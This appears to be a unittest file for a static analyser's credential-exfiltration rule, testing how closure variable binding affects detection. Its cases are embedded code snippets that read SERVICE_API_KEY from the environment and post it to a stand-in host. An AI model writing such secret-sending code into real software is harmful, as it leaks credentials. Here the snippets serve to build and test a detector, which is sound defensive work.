"""Lexical closure reads are resolved at calls, never executed during analysis."""

import unittest
from test_qindun_certify import MODULE


class PythonClosureBindingTests(unittest.TestCase):
    def test_direct_closure_binding(self):
        prefix = "import os,requests\n"
        secret = 'os.getenv("SERVICE_API_KEY")'
        send = 'requests.post("https://other.invalid",data=key)'
        cases = [
            (
                "def outer(key):\n    def send():\n        "
                + send
                + "\n    send: object\n    send()\nouter("
                + secret
                + ")\n",
                True,
            ),
            (
                "def outer(key):\n    def send():\n        "
                + send
                + "\n    (send,)=(print,)\n    send()\nouter("
                + secret
                + ")\n",
                False,
            ),
            (
                'key="public"\ndef outer(key):\n    def send():\n        global key\n        '
                + send
                + "\n    send()\nouter("
                + secret
                + ")\n",
                False,
            ),
            (
                "key="
                + secret
                + "\ndef outer(key):\n    def send():\n        global key\n        "
                + send
                + '\n    send()\nouter("public")\n',
                True,
            ),
            (
                "def outer(key):\n    def send():\n        "
                + send
                + "\n    return\n    send()\nouter("
                + secret
                + ")\n",
                False,
            ),
            (
                "def outer(key):\n    def send():\n        "
                + send
                + "\n    def caller(send):\n        send()\n    caller(print)\nouter("
                + secret
                + ")\n",
                False,
            ),
            (
                "def outer(key):\n    def send():\n        "
                + send
                + "\n    send=42\n    send()\nouter("
                + secret
                + ")\n",
                False,
            ),
            (
                "def outer():\n    def send():\n        "
                + send
                + "\n    key="
                + secret
                + "\n    send()\nouter()\n",
                True,
            ),
            (
                "def outer():\n    key="
                + secret
                + "\n    def send():\n        "
                + send
                + '\n    key="public"\n    send()\nouter()\n',
                False,
            ),
            (
                "def outer(key):\n    def send():\n        "
                + send
                + "\n    send()\nouter("
                + secret
                + ")\n",
                True,
            ),
            (
                "def outer(key):\n    def send(key):\n        "
                + send
                + '\n    send("public")\nouter('
                + secret
                + ")\n",
                False,
            ),
            (
                'def outer(key):\n    def send():\n        key="public"\n        '
                + send
                + "\n    send()\nouter("
                + secret
                + ")\n",
                False,
            ),
            (
                'def outer():\n    key="public"\n    def send():\n        '
                + send
                + "\n    if unknown:\n        key="
                + secret
                + "\n    send()\nouter()\n",
                True,
            ),
            (
                "def outer():\n    key="
                + secret
                + "\n    def send(key=key):\n        "
                + send
                + '\n    key="public"\n    send()\nouter()\n',
                True,
            ),
            (
                'def outer(key):\n    def send(value):\n        requests.post("https://other.invalid",data=value)\n    send(key)\nouter('
                + secret
                + ")\n",
                True,
            ),
            (
                "def outer(key):\n    def send():\n        "
                + send
                + '\n    def caller(key):\n        send()\n    caller("public")\nouter('
                + secret
                + ")\n",
                True,
            ),
            (
                "def outer(key):\n    def send():\n        "
                + send
                + "\n    def caller(key):\n        send()\n    caller("
                + secret
                + ')\nouter("public")\n',
                False,
            ),
            (
                "def outer():\n    def value():\n        return key\n    key="
                + secret
                + '\n    requests.post("https://other.invalid",data=value())\nouter()\n',
                True,
            ),
            (
                "def outer(key):\n    def middle():\n        def send():\n            "
                + send
                + "\n        send()\n    middle()\nouter("
                + secret
                + ")\n",
                True,
            ),
            (
                "def outer(key):\n    def send():\n        "
                + send
                + '\n    send()\nouter("public")\nouter('
                + secret
                + ")\n",
                True,
            ),
        ]
        for source, expected in cases:
            with self.subTest(source=source):
                hits, error = MODULE._python_flow_findings("main.py", prefix + source)
                self.assertIsNone(error)
                self.assertEqual(
                    any(
                        h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION"
                        and h.disposition == "confirmed"
                        for h in hits
                    ),
                    expected,
                )

    def test_escape_and_nonlocal_effects_report_incomplete(self):
        for source in [
            'def outer(key):\n    def inner():\n        return key\n    return inner\nouter("public")\n',
            'def outer(key):\n    def inner():\n        nonlocal key\n        key="public"\n    inner()\nouter("public")\n',
        ]:
            with self.subTest(source=source):
                _, error = MODULE._python_flow_findings("main.py", source)
                self.assertIsNotNone(error)

    def test_unused_closure_retains_only_candidate(self):
        source = (
            "import os,requests\ndef outer():\n"
            '    def send():\n        requests.post("https://other.invalid",data=key)\n'
            '    key=os.getenv("SERVICE_API_KEY")\nouter()\n'
        )
        hits, error = MODULE._python_flow_findings("main.py", source)
        self.assertIsNone(error)
        self.assertEqual(
            {h.disposition for h in hits if h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION"},
            {"candidate"},
        )

    def test_closure_auth_and_payload_are_distinct(self):
        source = (
            "import os,requests\ndef outer(key):\n"
            "    def send():\n"
            '        requests.get("https://service.invalid",headers={"X-API-Key":key})\n'
            '        requests.post("https://other.invalid",data=key)\n'
            '    send()\nouter(os.getenv("SERVICE_API_KEY"))\n'
        )
        hits, error = MODULE._python_flow_findings("main.py", source)
        self.assertIsNone(error)
        self.assertEqual(
            {h.disposition for h in hits if h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION"},
            {"candidate", "confirmed"},
        )
